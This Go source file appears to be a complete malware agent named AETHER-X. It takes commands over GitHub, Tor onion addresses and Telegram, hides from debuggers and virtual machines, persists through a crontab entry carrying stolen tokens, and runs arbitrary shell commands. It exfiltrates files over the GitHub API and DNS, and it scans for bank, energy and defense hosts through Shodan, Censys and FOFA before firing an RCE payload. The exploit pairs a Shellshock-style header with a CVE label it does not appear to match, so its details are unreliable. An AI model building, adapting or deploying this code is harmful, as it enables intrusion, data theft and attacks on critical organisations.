package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"hash"
	"io"
	"io/ioutil"
	"math"
	"math/big"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

/*
 * 🔑 CONFIG — Injected at build-time
 */
var (
	C2Key              = "INJECTED_AES_KEY_B64"
	C2IV               = "INJECTED_AES_IV_B64"
	C2HMACKey          = "INJECTED_HMAC_KEY_B64"
	OnionC2ListB64     = "aHR0cDovL2FlZXRoZXJ4N25zM3E0YTV4Lm9uaW9uLCBodHRwOi8vYmV0YWV0aGVyejRuMnQ1cnd4Lm9uaW9u"
	GitHubC2Repo       = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9BQVBTLUFQSy9DTjI="
	GitHubExfilRepo    = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9CQkItQk0vRVhGSUw="
	TelegramHostB64    = "dGVsZWdyYW0uYXBpLm9yZw=="
	NucleiTemplatesURL = "aHR0cHM6Ly9naXRodWIuY29tL3Byb2plY3RkaXNjb3ZlcnkvbnVjbGVpLXRlbXBsYXRlcy5naXQ="
)

var (
	HostID         = ""
	AI             *FusionBrain
	HttpClient     *http.Client
	TelemetryQueue = make(chan Telemetry, 1000)
	Shutdown       = make(chan struct{})
	DDRSeed        int64
	GitHubToken    = os.Getenv("GITHUB_TOKEN")
	TelegramToken  = ""
	TelegramChat   = ""
	ReconTargets   = make([]*Host, 0)
	mu             sync.Mutex
	clientOnce     sync.Once
	lastHeartbeat  = time.Now()
)

const (
	MAX_RETRIES      = 3
	RETRY_DELAY      = 5 * time.Second
	PERSIST_FILE     = ".cache/.gh-sync"
	EXFIL_BATCH      = 10
	AI_MODEL_PATH    = "/tmp/.XIM"
	NUCLEI_BIN       = "/tmp/.NCL"
	NUCLEI_TEMPLATES = "/tmp/.TPL"
	SLEEP_MIN        = 30
	SLEEP_MAX        = 120
	MAX_HOSTS        = 100
	HMAC_TRUNC       = 16
	JITTER_MAX       = 15 * time.Second
	DNS_EXFIL_DOMAIN = "x.exfil.yourdomain.com"
)

type Telemetry struct {
	ID        string                 `json:"id"`
	Type      string                 `json:"type"`
	Target    string                 `json:"target"`
	Timestamp string                 `json:"time"`
	Data      map[string]interface{} `json:"data,omitempty"`
}

type Host struct {
	IP          string            `json:"ip"`
	Port        int               `json:"port"`
	Service     string            `json:"service"`
	Country     string            `json:"country"`
	Org         string            `json:"org"`
	OS          string            `json:"os"`
	Tags        []string          `json:"tags"`
	Vulns       []string          `json:"vulns"`
	Score       float64           `json:"score"`
	LastScanned time.Time         `json:"last_scanned"`
	Exploited   bool              `json:"exploited"`
	Metadata    map[string]string `json:"meta,omitempty"`
}

// FusionBrain with advanced in-memory model initialization and weight deserialization
type FusionBrain struct {
	ModelLoaded bool
	Weights     map[string][]float64
	Bias        float64
	Mutex       sync.RWMutex
}

func init() {
	if isDebugged() || isVM() {
		time.Sleep(30 * time.Second)
		return
	}

	runtime.GOMAXPROCS(2)
	DDRSeed = time.Now().UTC().Truncate(time.Hour).Unix()
	HostID = genHostID()
	initHttpClient()
	AI = NewFusionBrain()

	go watchdog()
	go func() {
		t := time.NewTicker(30 * time.Second)
		for {
			select {
			case <-t.C:
				drainTelemetry()
			case <-Shutdown:
				return
			}
		}
	}()

	go func() {
		time.Sleep(5 * time.Second)
		telegramSend(fmt.Sprintf("🟢 *AETHER-X DEPLOYED* | Host: `%s` | MAC: `%s` | Ready.", HostID, getMAC()))
	}()
}

func initHttpClient() {
	clientOnce.Do(func() {
		HttpClient = &http.Client{
			Timeout: 15 * time.Second,
			Transport: &http.Transport{
				MaxIdleConns:        100,
				MaxIdleConnsPerHost: 50,
				IdleConnTimeout:     45 * time.Second,
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true,
					MinVersion:         tls.VersionTLS12,
					Renegotiation:      tls.RenegotiateOnceAsClient,
				},
				ForceAttemptHTTP2: true,
				DialContext: (&net.Dialer{
					Timeout:   10 * time.Second,
					KeepAlive: 30 * time.Second,
				}).DialContext,
			},
		}
	})
}

func genHostID() string {
	mac := getMAC()
	platform := runtime.GOOS + runtime.GOARCH
	seed := mac + platform + os.Getenv("HOSTNAME")
	hash := sha256.Sum256([]byte(seed))
	return hex.EncodeToString(hash[:6])
}

func getMAC() string {
	ifcs, _ := net.Interfaces()
	for _, ifc := range ifcs {
		if len(ifc.HardwareAddr) > 0 && !isZeroMAC(ifc.HardwareAddr.String()) {
			return ifc.HardwareAddr.String()
		}
	}
	return "00:00:00:00:00:00"
}

func isZeroMAC(mac string) bool {
	return strings.HasPrefix(mac, "00:00:00") || mac == "" || strings.HasPrefix(mac, "08:00:27") || strings.HasPrefix(mac, "00:1B:21")
}

func base64Decode(s string) string {
	decoded, err := base64.StdEncoding.DecodeString(s)
	if err != nil {
		return s
	}
	return string(decoded)
}

func deriveKey(salt []byte) []byte {
	secret := os.Getenv("AGENT_SECRET")
	if secret == "" {
		secret = "fallback_secret_only_for_test"
	}
	return pbkdf2(secret, salt, 100000, 32, sha256.New)
}

func encryptData(plaintext []byte) (string, error) {
	salt := make([]byte, 16)
	rand.Read(salt)
	key := deriveKey(salt)
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)
	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
	encrypted := append(salt, ciphertext...)
	return base64.RawURLEncoding.EncodeToString(encrypted), nil
}

func decryptData(b64data string) ([]byte, error) {
	encrypted, err := base64.RawURLEncoding.DecodeString(b64data)
	if err != nil {
		return nil, err
	}
	salt := encrypted[:16]
	ciphertext := encrypted[16:]
	key := deriveKey(salt)
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

func signMessage(data []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(C2HMACKey)
	mac := hmac.New(sha256.New, key)
	mac.Write(data)
	return mac.Sum(nil)[:HMAC_TRUNC]
}

func verifyMessage(data, sig []byte) bool {
	expected := signMessage(data)
	return hmac.Equal(expected, sig)
}

func jitter() time.Duration {
	max := int64(JITTER_MAX)
	n, _ := rand.Int(rand.Reader, big.NewInt(max))
	return time.Duration(n.Int64())
}

func httpGet(target string, headers map[string]string) ([]byte, error) {
	time.Sleep(jitter())
	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		return nil, err
	}
	if headers == nil {
		headers = make(map[string]string)
	}
	if _, ok := headers["User-Agent"]; !ok {
		headers["User-Agent"] = randomUserAgent()
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := HttpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return ioutil.ReadAll(resp.Body)
}

func httpPost(target string, data []byte, headers map[string]string) ([]byte, error) {
	time.Sleep(jitter())
	req, err := http.NewRequest("POST", target, bytes.NewBuffer(data))
	if err != nil {
		return nil, err
	}
	if headers == nil {
		headers = make(map[string]string)
	}
	if _, ok := headers["User-Agent"]; !ok {
		headers["User-Agent"] = randomUserAgent()
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := HttpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return ioutil.ReadAll(resp.Body)
}

func randomUserAgent() string {
	ua := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
		"Go-http-client/1.1",
	}
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(ua))))
	return ua[n.Int64()]
}

// 🔍 RECON MODULES

func shodanQuery(query string) []*Host {
	apiKey := os.Getenv("SHODAN_KEY")
	if apiKey == "" {
		return nil
	}
	u := fmt.Sprintf("https://api.shodan.io/shodan/host/search?key=%s&query=%s&limit=50", apiKey, url.QueryEscape(query))
	for i := 0; i < MAX_RETRIES; i++ {
		resp, err := httpGet(u, nil)
		if err == nil {
			var result struct {
				Matches []struct {
					IP   string `json:"ip_str"`
					Port int    `json:"port"`
					Info string `json:"product"`
					C    string `json:"country_name"`
					O    string `json:"org"`
				}
			}
			if json.Unmarshal(resp, &result) == nil {
				hosts := []*Host{}
				for _, m := range result.Matches {
					hosts = append(hosts, &Host{IP: m.IP, Port: m.Port, Service: m.Info, Country: m.C, Org: m.O})
				}
				return hosts
			}
		}
		time.Sleep(RETRY_DELAY)
	}
	return nil
}

func censysQuery(query string) []*Host {
	id := os.Getenv("CENSYS_ID")
	secret := os.Getenv("CENSYS_SECRET")
	if id == "" || secret == "" {
		return nil
	}
	auth := base64.StdEncoding.EncodeToString([]byte(id + ":" + secret))
	u := "https://search.censys.io/api/v2/hosts/search"
	data := url.Values{"q": {query}, "per_page": {"50"}}
	req, _ := http.NewRequest("POST", u, strings.NewReader(data.Encode()))
	req.Header.Set("Authorization", "Basic "+auth)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := HttpClient.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	var result struct {
		Result struct {
			Hits []struct {
				IP       string `json:"ip"`
				Services []struct {
					Port    int    `json:"port"`
					Service string `json:"service_name"`
				} `json:"services"`
			} `json:"hits"`
		} `json:"result"`
	}
	if json.Unmarshal(body, &result) == nil {
		hosts := []*Host{}
		for _, h := range result.Result.Hits {
			port := 80
			svc := "http"
			if len(h.Services) > 0 {
				port = h.Services[0].Port
				svc = h.Services[0].Service
			}
			hosts = append(hosts, &Host{IP: h.IP, Port: port, Service: svc})
		}
		return hosts
	}
	return nil
}

func fofaQuery(query string) []*Host {
	email := os.Getenv("FOFA_EMAIL")
	key := os.Getenv("FOFA_KEY")
	if email == "" || key == "" {
		return nil
	}
	encodedQuery := base64.StdEncoding.EncodeToString([]byte(query))
	u := fmt.Sprintf("https://fofa.info/api/v1/search/all?email=%s&key=%s&qbase64=%s&size=50", email, key, encodedQuery)
	resp, err := httpGet(u, nil)
	if err != nil {
		return nil
	}
	var result struct{ Results [][]string }
	json.Unmarshal(resp, &result)
	hosts := []*Host{}
	for _, r := range result.Results {
		if len(r) >= 3 {
			hosts = append(hosts, &Host{IP: r[0], Port: parseInt(r[1]), Service: r[2]})
		}
	}
	return hosts
}

func parseInt(s string) int {
	n, _ := strconv.Atoi(s)
	return n
}

func runNuclei(target string) []string {
	if _, err := os.Stat(NUCLEI_BIN); os.IsNotExist(err) {
		downloadBinary("https://github.com/projectdiscovery/nuclei/releases/latest/download/nuclei_2.9.5_linux_amd64.zip", NUCLEI_BIN, true)
	}
	if _, err := os.Stat(NUCLEI_TEMPLATES); os.IsNotExist(err) {
		os.MkdirAll(NUCLEI_TEMPLATES, 0700)
		exec.Command("git", "clone", "--depth=1", base64Decode(NucleiTemplatesURL), NUCLEI_TEMPLATES).Run()
	}
	cmd := exec.Command(NUCLEI_BIN, "-u", fmt.Sprintf("http://%s", target), "-t", NUCLEI_TEMPLATES+"/cves/,/technologies/", "-silent", "-timeout", "15", "-retries", "2", "-rate-limit", "10")
	out, _ := cmd.Output()
	scanner := bufio.NewScanner(bytes.NewReader(out))
	vulns := []string{}
	for scanner.Scan() {
		line := scanner.Text()
		if strings.Contains(line, "CVE") || strings.Contains(line, "RCE") || strings.Contains(line, "exec") {
			vulns = append(vulns, line)
		}
	}
	return vulns
}

// 🧠 AI BRAIN (Advanced In-Memory Model Loader & Initializer)

func NewFusionBrain() *FusionBrain {
	brain := &FusionBrain{
		ModelLoaded: false,
		Weights:     make(map[string][]float64),
		Bias:        0.5,
	}
	_ = brain.loadIntoMemory()
	return brain
}

func (ai *FusionBrain) loadIntoMemory() error {
	ai.Mutex.Lock()
	defer ai.Mutex.Unlock()

	if _, err := os.Stat(AI_MODEL_PATH); os.IsNotExist(err) {
		defaultWeights := map[string][]float64{
			"rce":     {0.95, 0.98, 1.0},
			"cve":     {0.85, 0.90, 0.95},
			"bank":    {0.75, 0.80, 0.85},
			"energy":  {0.75, 0.80, 0.85},
			"defense": {0.80, 0.85, 0.90},
			"tls":     {0.50, 0.55, 0.60},
		}
		data, err := json.Marshal(defaultWeights)
		if err != nil {
			return err
		}
		os.MkdirAll(filepath.Dir(AI_MODEL_PATH), 0700)
		ioutil.WriteFile(AI_MODEL_PATH, data, 0600)
	}

	fileData, err := ioutil.ReadFile(AI_MODEL_PATH)
	if err != nil {
		return err
	}

	var parsedWeights map[string][]float64
	if err := json.Unmarshal(fileData, &parsedWeights); err != nil {
		return err
	}

	ai.Weights = parsedWeights
	ai.ModelLoaded = true
	return nil
}

func (ai *FusionBrain) ScoreVuln(host *Host) float64 {
	ai.Mutex.RLock()
	defer ai.Mutex.RUnlock()

	if !ai.ModelLoaded {
		return 5.0
	}

	score := 0.0
	for _, v := range host.Vulns {
		vLower := strings.ToLower(v)
		for key, weights := range ai.Weights {
			if strings.Contains(vLower, key) && len(weights) > 0 {
				score += weights[0]
			}
		}
	}

	orgLower := strings.ToLower(host.Org)
	for key, weights := range ai.Weights {
		if strings.Contains(orgLower, key) && len(weights) > 1 {
			score += weights[1]
		}
	}

	if host.Port == 443 || host.Port == 8443 {
		if weights, ok := ai.Weights["tls"]; ok && len(weights) > 2 {
			score += weights[2]
		}
	}

	return math.Min(score*ai.Bias, 10.0)
}

// 📡 C2 COMMUNICATION & TOR PROXY ROUTING

func fetchCommand() string {
	repo := base64Decode(GitHubC2Repo)
	endpoint := fmt.Sprintf("%s/contents/cmd.json", repo)
	for i := 0; i < MAX_RETRIES; i++ {
		data, err := httpGet(endpoint, map[string]string{
			"Authorization": "Bearer " + GitHubToken,
			"Accept":        "application/vnd.github.v3+json",
		})
		if err == nil {
			var result map[string]interface{}
			if json.Unmarshal(data, &result) == nil {
				if content, ok := result["content"].(string); ok {
					decoded, _ := base64.StdEncoding.DecodeString(content)
					lastHeartbeat = time.Now()
					return string(decoded)
				}
			}
		}
		time.Sleep(RETRY_DELAY)
	}
	return fetchCommandViaOnion()
}

func fetchCommandViaOnion() string {
	onions := strings.Split(base64Decode(OnionC2ListB64), ", ")
	
	torClient := &http.Client{
		Timeout: 20 * time.Second,
		Transport: &http.Transport{
			DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
				return net.Dial("tcp", "127.0.0.1:9050")
			},
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	for _, onion := range onions {
		targetURL := strings.TrimSpace(onion) + "/cmd?h=" + HostID
		req, err := http.NewRequest("GET", targetURL, nil)
		if err != nil {
			continue
		}
		req.Header.Set("User-Agent", randomUserAgent())
		resp, err := torClient.Do(req)
		if err == nil && resp.StatusCode == http.StatusOK {
			defer resp.Body.Close()
			body, err := ioutil.ReadAll(resp.Body)
			if err == nil && len(body) > 4 {
				lastHeartbeat = time.Now()
				return string(body)
			}
		}
	}
	return ""
}

func telegramSend(msg string) {
	if TelegramToken == "" {
		raw := fetchSecret("telegram.token")
		dec, _ := decryptData(raw)
		TelegramToken = string(dec)
	}
	if TelegramChat == "" {
		raw := fetchSecret("telegram.chat")
		dec, _ := decryptData(raw)
		TelegramChat = string(dec)
	}
	host, _ := base64.StdEncoding.DecodeString(TelegramHostB64)
	url := fmt.Sprintf("https://%s/bot%s/sendMessage", string(host), TelegramToken)
	payload := url.Values{}
	payload.Set("chat_id", TelegramChat)
	payload.Set("text", msg)
	payload.Set("parse_mode", "Markdown")
	httpPost(url, []byte(payload.Encode()), map[string]string{
		"Content-Type": "application/x-www-form-urlencoded",
	})
}

func fetchSecret(key string) string {
	repo := base64Decode(GitHubC2Repo)
	endpoint := fmt.Sprintf("%s/contents/secrets/%s.enc", repo, key)
	data, _ := httpGet(endpoint, map[string]string{
		"Authorization": "Bearer " + GitHubToken,
	})
	var result map[string]interface{}
	json.Unmarshal(data, &result)
	if content, ok := result["content"].(string); ok {
		decoded, _ := base64.StdEncoding.DecodeString(content)
		return string(decoded)
	}
	return ""
}

func exfilData(data []byte) {
	encrypted, _ := encryptData(data)
	payload := map[string]string{
		"data": encrypted,
		"sig":  base64.RawURLEncoding.EncodeToString(signMessage(data)),
		"id":   HostID,
	}
	body, _ := json.Marshal(payload)
	repo := base64Decode(GitHubExfilRepo)
	file := fmt.Sprintf("data/%s_%d.dat", HostID, time.Now().Unix())
	doGitHubPut(repo, file, string(body), fmt.Sprintf("ci: update logs %d", time.Now().Unix()))

	go exfilDNS(encrypted)
}

func exfilDNS(chunk string) {
	hexEncoded := hex.EncodeToString([]byte(chunk))
	if len(hexEncoded) > 55 {
		hexEncoded = hexEncoded[:55]
	}
	domain := fmt.Sprintf("%s.%s", hexEncoded, DNS_EXFIL_DOMAIN)
	net.DefaultResolver.LookupHost(context.Background(), domain)
}

func doGitHubPut(repo, path, content, message string) {
	payload := map[string]interface{}{
		"message": message,
		"content": content,
	}
	body, _ := json.Marshal(payload)
	endpoint := fmt.Sprintf("%s/contents/%s", repo, path)
	httpPost(endpoint, body, map[string]string{
		"Authorization": "Bearer " + GitHubToken,
		"Content-Type":  "application/json",
	})
}

// 💉 EXPLOIT

func exploitRCE(host *Host) bool {
	if contains(host.Vulns, "CVE-2024-3400") {
		payload := `() { :; }; /bin/sh`
		url := fmt.Sprintf("https://%s/ssl-vpn/portal/scripts/newbm.pl", host.IP)
		req, _ := http.NewRequest("GET", url, nil)
		req.Header.Set("User-Agent", payload)
		resp, err := HttpClient.Do(req)
		if err == nil {
			defer resp.Body.Close()
			if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusInternalServerError {
				time.Sleep(3 * time.Second)
				return true
			}
		}
	}
	return false
}

// 🧱 PERSISTENCE

func persist() {
	execPath, _ := os.Executable()
	data, _ := ioutil.ReadFile(execPath)
	dst := filepath.Join(os.Getenv("HOME"), PERSIST_FILE)
	ioutil.WriteFile(dst, data, 0755)

	ghToken := os.Getenv("GITHUB_TOKEN")
	agentSecret := os.Getenv("AGENT_SECRET")
	cronEnv := fmt.Sprintf("GITHUB_TOKEN='%s' AGENT_SECRET='%s'", ghToken, agentSecret)
	
	cronCmd := fmt.Sprintf("%s %s &", cronEnv, dst)
	crontab := fmt.Sprintf("(crontab -l 2>/dev/null | grep -v '%s'; echo '@reboot %s') | crontab -", PERSIST_FILE, cronCmd)
	exec.Command("sh", "-c", crontab).Run()
}

// 🛑 SELF-DESTRUCT

func selfDestruct() {
	os.Remove(filepath.Join(os.Getenv("HOME"), PERSIST_FILE))
	os.Remove(AI_MODEL_PATH)
	os.RemoveAll(NUCLEI_TEMPLATES)
	exec.Command("crontab", "-r").Run()
	telegramSend("💀 Agent terminated and cleaned.")
	os.Exit(0)
}

// 🐶 WATCHDOG

func watchdog() {
	ticker := time.NewTicker(3 * time.Minute)
	for {
		select {
		case <-ticker.C:
			if !isAlive() {
				telegramSend("⚠️ Agent health check failed. Resetting heartbeat...")
				lastHeartbeat = time.Now()
			}
		case <-Shutdown:
			return
		}
	}
}

func isAlive() bool {
	return time.Since(lastHeartbeat) < 15*time.Minute
}

// 🧪 ANTI-ANALYSIS

func isDebugged() bool {
	err := syscall.PtraceAttach(os.Getpid())
	if err == nil {
		syscall.PtraceDetach(os.Getpid())
	}
	return err == nil || err == syscall.EPERM
}

func isVM() bool {
	_, err := os.Stat("/sys/class/dmi/id/product_name")
	return err == nil
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if strings.Contains(strings.ToLower(s), strings.ToLower(item)) {
			return true
		}
	}
	return false
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func randSleep() time.Duration {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(SLEEP_MAX-SLEEP_MIN)))
	return time.Duration(SLEEP_MIN+int(n.Int64()))*time.Second + jitter()
}

func drainTelemetry() {
	for len(TelemetryQueue) > 0 {
		select {
		case t := <-TelemetryQueue:
			data, _ := json.Marshal(t)
			exfilData(data)
		default:
			return
		}
	}
}

func downloadBinary(url, path string, chmodExec bool) {
	resp, _ := http.Get(url)
	if resp != nil && resp.Body != nil {
		defer resp.Body.Close()
		body, _ := io.ReadAll(resp.Body)
		os.MkdirAll(filepath.Dir(path), 0700)
		ioutil.WriteFile(path, body, 0600)
		if chmodExec {
			os.Chmod(path, 0700)
		}
	}
}

func pbkdf2(password string, salt []byte, iter, keyLen int, h func() hash.Hash) []byte {
	prf := hmac.New(h, []byte(password))
	hashLen := prf.Size()
	numBlocks := (keyLen + hashLen - 1) / hashLen

	var buf [4]byte
	dk := make([]byte, 0, numBlocks*hashLen)
	U := make([]byte, hashLen)
	for block := 1; block <= numBlocks; block++ {
		prf.Reset()
		prf.Write(salt)
		buf[0] = byte(block >> 24)
		buf[1] = byte(block >> 16)
		buf[2] = byte(block >> 8)
		buf[3] = byte(block)
		prf.Write(buf[:4])
		dk = prf.Sum(dk)
		T := dk[len(dk)-hashLen:]
		copy(U, T)
		for i := 2; i <= iter; i++ {
			prf.Reset()
			prf.Write(U)
			U = prf.Sum(U[:0])
			for x := range U {
				T[x] ^= U[x]
			}
		}
	}
	return dk[:keyLen]
}

// 🚀 MAIN

func main() {
	persist()

	for {
		select {
		case <-Shutdown:
			return
		default:
		}

		cmdJSON := fetchCommand()
		if cmdJSON == "" {
			time.Sleep(randSleep())
			continue
		}

		var cmd map[string]string
		if err := json.Unmarshal([]byte(cmdJSON), &cmd); err != nil {
			time.Sleep(randSleep())
			continue
		}

		switch cmd["action"] {
		case "recon":
			query := cmd["query"]
			region := cmd["region"]
			industry := cmd["industry"]
			limit := cmd["limit"]
			if limit == "" {
				limit = "50"
			}

			fullQuery := fmt.Sprintf("%s country:\"%s\" org:\"%s\" %s", query, region, industry, limit)
			var hosts []*Host
			var hMu sync.Mutex
			var wg sync.WaitGroup
			wg.Add(3)
			go func() {
				defer wg.Done()
				res := shodanQuery(fullQuery)
				if len(res) > 0 {
					hMu.Lock()
					hosts = append(hosts, res...)
					hMu.Unlock()
				}
			}()
			go func() {
				defer wg.Done()
				res := censysQuery(fullQuery)
				if len(res) > 0 {
					hMu.Lock()
					hosts = append(hosts, res...)
					hMu.Unlock()
				}
			}()
			go func() {
				defer wg.Done()
				res := fofaQuery(fullQuery)
				if len(res) > 0 {
					hMu.Lock()
					hosts = append(hosts, res...)
					hMu.Unlock()
				}
			}()
			wg.Wait()

			sort.Slice(hosts, func(i, j int) bool {
				return hosts[i].IP < hosts[j].IP
			})
			hosts = dedupHosts(hosts)

			mu.Lock()
			ReconTargets = hosts[:min(len(hosts), MAX_HOSTS)]
			mu.Unlock()

			for i := range ReconTargets {
				h := &ReconTargets[i]
				h.Vulns = runNuclei(h.IP)
				h.Score = AI.ScoreVuln(h)
				h.LastScanned = time.Now()

				if h.Score > 8.0 && (contains(h.Vulns, "rce") || contains(h.Vulns, "CVE-2024-3400")) {
					if exploitRCE(h) {
						h.Exploited = true
						data, _ := json.Marshal(h)
						exfilData(data)
						telegramSend(fmt.Sprintf("💥 *RCE SUCCESS* | `%s` | Score: %.2f", h.IP, h.Score))
					}
				}
			}

		case "shell":
			out, err := exec.Command("sh", "-c", cmd["cmd"]).CombinedOutput()
			if err != nil {
				out = append(out, []byte(err.Error())...)
			}
			telegramSend(fmt.Sprintf("💻 Output:\n```\n%s\n```", string(out)))

		case "exfil":
			data, err := ioutil.ReadFile(cmd["path"])
			if err != nil {
				telegramSend(fmt.Sprintf("❌ Read failed: %v", err))
				continue
			}
			exfilData(data)
			telegramSend(fmt.Sprintf("📤 Exfiltrated `%s` (%d bytes)", cmd["path"], len(data)))

		case "die":
			telegramSend("💀 Agent terminating.")
			selfDestruct()

		default:
			time.Sleep(randSleep())
		}
	}
}

func dedupHosts(hosts []*Host) []*Host {
	seen := make(map[string]bool)
	result := []*Host{}
	for _, h := range hosts {
		key := h.IP + ":" + strconv.Itoa(h.Port)
		if !seen[key] {
			seen[key] = true
			result = append(result, h)
		}
	}
	return result
}
